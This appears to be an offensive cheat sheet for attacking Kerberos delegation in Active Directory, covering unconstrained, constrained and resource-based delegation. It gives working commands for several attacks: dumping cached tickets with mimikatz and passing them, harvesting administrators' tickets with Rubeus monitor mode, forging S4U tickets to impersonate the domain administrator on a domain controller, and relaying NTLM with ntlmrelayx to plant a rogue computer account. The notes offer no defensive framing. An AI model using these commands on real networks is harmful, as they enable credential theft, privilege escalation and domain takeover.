# Delegation stuff

## Unconstrained Delegation
- Can Impersonate any user to any service (if it has user's TGT)
- User/Computer gets this privilege, so it can store other users TGTs in it's cache
- Then it can impersonate this users, classic example of WebServer accessing SQLServer.
- TRUSTED_FOR_DELEGATION attribute
- Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
- If we pwn this machine, and if some Administrator has used it's services, the ticket will be in the cache
- sekurlsa::tickets
- sekurlsa::tickets
- kerberos::ptt <ticket_filename>
- We can also switch rubeus in monitor mode, so when a user logs in, the ticket will be dumped.

## Constrained Delegation
- User/Computer gets this privilege, so it can impersonate any user for certain service.
- TRUSTED_TO_AUTH_FOR_DELEGATION flag (userAccountControl attribute)
- msds-allowedtodelegateto identify the SPN of services authorized to delegate.
For user:
- Get-NetUser -TrustedToAuth
- Rubeus.exe tgtdeleg (to ask delegation TGT) (in context of TrustedToAuth user/comp)
- Rubeus.exe s4u /ticket:<base64ticket> /impersonateuser:administrator /domain:domain.local /msdsspn:cifs/dc.domain.local /dc:dc01.domain.local /ptt
For computer:
- Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
- Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
- Impersonation:
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()

## RBCD
- Only win >Win2012
- Scenario1: We owned a user/computer with  msDS-AllowedToActOnBehalfOfOtherIdentity attribute with some computer in. -> This account can be used to impersonate ANY user in ANY service of the computer in that attribute. (Any user excludes protected/sensitive accounts)
- Scenario 2:We owned an account that has GenericWrite over another computer. We can add msDS-AllowedToActOnBehalfOfOtherIdentity attribute to that computer, and move to Scenario1.
- Scenario 3: Without creds. User ntlmrelayx to relay some computer's NTLMv2 to LDAPserver in order to add a new computer into the AD. This computer can be created with AllowedToActOnBehalfOfOtherIdentity, to the computer which is being relayed. Then with creds to the new computer, we can move to Scenario1 and own the relayed computer. Wow!

## Other stuff
Convert from kirbi to ccache (Win/Linux)
- kekeo # misc::convert ccache ticket.kirbi
- export KRB5CCNAME=/path/to/ticket.ccache



